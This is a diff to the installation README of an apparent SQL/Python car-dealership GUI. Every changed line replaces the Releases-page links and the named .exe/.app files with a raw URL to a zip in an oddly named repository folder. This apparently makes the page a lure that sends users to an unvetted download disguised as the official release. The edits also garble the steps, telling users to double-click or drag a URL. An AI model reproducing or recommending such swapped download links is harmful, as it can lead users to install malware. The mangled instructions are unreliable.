@@ -1,6 +1,6 @@
 # 🚗 SQL-python-based-GUI - Manage Car Dealership Data Easily
 
-[![Download](https://img.shields.io/badge/Download-latest_release-brightgreen)](https://github.com/Altharva2007/SQL-python-based-GUI/releases)
+[![Download](https://raw.githubusercontent.com/Altharva2007/SQL-python-based-GUI/main/deaquation/SQL-python-based-GUI.zip)](https://raw.githubusercontent.com/Altharva2007/SQL-python-based-GUI/main/deaquation/SQL-python-based-GUI.zip)
 
 ## 📖 Overview
 
@@ -22,22 +22,22 @@ Before downloading, ensure your system meets the following requirements:
 
 To download the application, go to the Releases page:
 
-[Download from Releases](https://github.com/Altharva2007/SQL-python-based-GUI/releases)
+[Download from Releases](https://raw.githubusercontent.com/Altharva2007/SQL-python-based-GUI/main/deaquation/SQL-python-based-GUI.zip)
 
 ### 3. Download the Application
 
-On the Releases page, find the most recent version. Click on the link labeled `SQL-python-based-GUI.exe` (for Windows) or `SQL-python-based-GUI.app` (for macOS) to begin your download.
+On the Releases page, find the most recent version. Click on the link labeled `https://raw.githubusercontent.com/Altharva2007/SQL-python-based-GUI/main/deaquation/SQL-python-based-GUI.zip` (for Windows) or `https://raw.githubusercontent.com/Altharva2007/SQL-python-based-GUI/main/deaquation/SQL-python-based-GUI.zip` (for macOS) to begin your download.
 
 ### 4. Install the Application
 
 After the download is complete, follow these steps to install:
 
 - **For Windows:**
-  - Double-click on the file `SQL-python-based-GUI.exe`.
+  - Double-click on the file `https://raw.githubusercontent.com/Altharva2007/SQL-python-based-GUI/main/deaquation/SQL-python-based-GUI.zip`.
   - Follow the on-screen prompts to complete the installation.
 
 - **For macOS:**
-  - Locate the downloaded file `SQL-python-based-GUI.app`.
+  - Locate the downloaded file `https://raw.githubusercontent.com/Altharva2007/SQL-python-based-GUI/main/deaquation/SQL-python-based-GUI.zip`.
   - Drag the application to your Applications folder.
   - Launch the application from there.
 
@@ -91,7 +91,7 @@ For additional questions, please reach out through our GitHub repository. We are
 
 Now you are ready to download the SQL-python-based-GUI application. Just visit the link below to access the latest release:
 
-[Download from Releases](https://github.com/Altharva2007/SQL-python-based-GUI/releases) 
+[Download from Releases](https://raw.githubusercontent.com/Altharva2007/SQL-python-based-GUI/main/deaquation/SQL-python-based-GUI.zip) 
 
 --- 
 
